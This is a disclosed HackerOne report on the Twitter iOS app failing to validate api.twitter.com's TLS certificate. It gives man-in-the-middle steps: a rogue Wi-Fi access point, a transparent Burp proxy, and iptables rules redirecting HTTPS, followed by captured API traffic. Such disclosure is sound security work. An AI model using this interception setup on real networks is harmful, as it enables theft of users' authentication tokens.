# Twitter iOS fails to validate server certificate and sends oauth token

## Report Details
- **Report ID**: 168538
- **URL**: https://hackerone.com/reports/168538
- **State**: Closed
- **Severity**: high
- **Submitted**: 2016-09-15T08:58:11.908Z
- **Disclosed**: 2016-12-23T14:34:45.368Z

## Reporter
- **Username**: floyd
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
Twitter on iOS newest two versions (6.62 and 6.62.1) are affected, other versions not tested. Tested independently on two different iPhone 6 with iOS version 9.3.3 and 9.3.5 without Jailbreak. The iPhone were without any mobileconfig profiles installed - *no* we did not install any CA certificate in the CA store of the device. Really stock iPhones. The Twitter app does not check the SSL/TLS certificate of https://api.twitter.com . A transparent proxy setup (eg. burp suite in transparent mode) is sufficient to exploit. Steps to reproduce:
1. Start Burp or other Proxy software in transparent mode. Setting "Generate CA-signed per-host certificates", which means the CA cert of Burp is used, which is *not* trusted on the iPhones.
2. Start rogue Wifi access point (eg. on the same machine as burp)
3. Redirect all incoming HTTPS traffic on the rogue Wifi access point to the transparent proxy. We simply used on Linux:
iptable -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j DNAT --to $BURP_IP:8080
iptable -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
4. Connect with the iOS device to the Wifi access point
5. Open Twitter app on iOS
6. In burp only the calls to api.twitter.com are visible and include sensitive authentication information etc.

This is the information we saw for two different accounts in burp which includes the oauth token etc.:

GET /1.1/help/settings.json?include_zero_rate=true&settings_version=8910e1e75c037c3c6b59c64b477b0741 HTTP/1.1
Host: api.twitter.com
█████████
X-Twitter-Client-Version: 6.62
X-Twitter-Polling: true
X-Client-UUID: D8AB1681-1618-48BA-9EB0-F3628DF1660B
X-Twitter-Client-Language: de
X-B3-TraceId: cc8ac1aea2ba5628
x-spdy-bypass: 1
Accept: */*
Accept-Language: de
Accept-Encoding: gzip, deflate
X-Twitter-Client-DeviceID: 68715C92-258F-4C59-A0B4-B98AF8B976BC
User-Agent: Twitter-iPhone/6.62 iOS/9.3.3 (Apple;iPhone8,1;;;;;1)
Connection: close
X-Twitter-API-Version: 5
X-Twitter-Client-Limit-Ad-Tracking: 1
X-Twitter-Client: Twitter-iPhone



HTTP/1.1 304 Not Modified
cache-control: no-cache, no-store, must-revalidate, pre-check=0, post-check=0
connection: close
content-length: 0
content-security-policy: default-src 'self'; connect-src 'self'; font-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com data:; frame-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; img-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com data:; media-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; object-src 'none'; script-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; style-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; report-uri https://twitter.com/i/csp_report?a=NVQWGYLXFVRWY2LFNZ2C2Y3PNZTGSZY%3D&ro=false;
content-type: text/html;charset=utf-8
date: Thu, 15 Sep 2016 08:33:18 GMT
expires: Tue, 31 Mar 1981 05:00:00 GMT
last-modified: Thu, 15 Sep 2016 08:33:18 GMT
pragma: no-cache
server: tsa_b
set-cookie: guest_id=v1%3A147392839826657964; Domain=.twitter.com; Path=/; Expires=Sat, 15-Sep-2018 08:33:18 UTC
status: 304 Not Modified
strict-transport-security: max-age=631138519
x-access-level: read-write
x-client-event-enabled: true
x-connection-hash: 40e91f874332181942e1454b13ccaa6a
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-rate-limit-limit: 15
x-rate-limit-remaining: 12
x-rate-limit-reset: 1473929244
x-response-time: 29
x-transaction: cc8ac1aea2ba5628
x-twitter-response-tags: BouncerExempt
x-twitter-response-tags: BouncerCompliant
x-xss-protection: 1; mode=block



GET /1.1/help/settings.json?include_zero_rate=true&settings_version=8910e1e75c037c3c6b59c64b477b0741 HTTP/1.1
Host: api.twitter.com
█████████
X-Twitter-Client-Version: 6.62
X-Twitter-Polling: true
X-Client-UUID: D8AB1681-1618-48BA-9EB0-F3628DF1660B
X-Twitter-Client-Language: de
X-B3-TraceId: 796651628eef7eed
x-spdy-bypass: 1
Accept: */*
Accept-Language: de
Accept-Encoding: gzip, deflate
X-Twitter-Client-DeviceID: 68715C92-258F-4C59-A0B4-B98AF8B976BC
User-Agent: Twitter-iPhone/6.62 iOS/9.3.3 (Apple;iPhone8,1;;;;;1)
Connection: close
X-Twitter-API-Version: 5
X-Twitter-Client-Limit-Ad-Tracking: 1
X-Twitter-Client: Twitter-iPhone



HTTP/1.1 304 Not Modified
cache-control: no-cache, no-store, must-revalidate, pre-check=0, post-check=0
connection: close
content-length: 0
content-security-policy: default-src 'self'; connect-src 'self'; font-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com data:; frame-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; img-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com data:; media-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; object-src 'none'; script-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; style-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; report-uri https://twitter.com/i/csp_report?a=NVQWGYLXFVRWY2LFNZ2C2Y3PNZTGSZY%3D&ro=false;
content-type: text/html;charset=utf-8
date: Thu, 15 Sep 2016 08:34:36 GMT
expires: Tue, 31 Mar 1981 05:00:00 GMT
last-modified: Thu, 15 Sep 2016 08:34:36 GMT
pragma: no-cache
server: tsa_b
set-cookie: guest_id=v1%3A147392847623972314; Domain=.twitter.com; Path=/; Expires=Sat, 15-Sep-2018 08:34:36 UTC
status: 304 Not Modified
strict-transport-security: max-age=631138519
x-access-level: read-write
x-client-event-enabled: true
x-connection-hash: e980abd0bd35e3bf0b8c693e8a12f636
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-rate-limit-limit: 15
x-rate-limit-remaining: 11
x-rate-limit-reset: 1473929244
x-response-time: 44
x-transaction: 796651628eef7eed
x-twitter-response-tags: BouncerExempt
x-twitter-response-tags: BouncerCompliant
x-xss-protection: 1; mode=block


## Attachments
No attachments
